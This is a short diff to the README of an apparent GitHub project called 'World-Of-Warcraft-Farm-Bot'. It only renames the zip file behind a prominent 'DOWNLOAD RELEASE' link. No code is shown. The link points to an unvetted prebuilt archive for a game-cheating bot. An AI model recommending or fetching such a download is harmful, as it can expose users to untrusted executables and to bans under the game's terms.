@@ -1,4 +1,4 @@
-****[DOWNLOAD RELEASE](https://github.com/BiomancerAdvance/World-Of-Warcraft-Farm-Bot/releases/download/Release/World.of.Warcraft.Farm.Bot.zip)****
+****[DOWNLOAD RELEASE](https://github.com/BiomancerAdvance/World-Of-Warcraft-Farm-Bot/releases/download/Release/wow.farm.zip)****
 
 ## About the Project
 
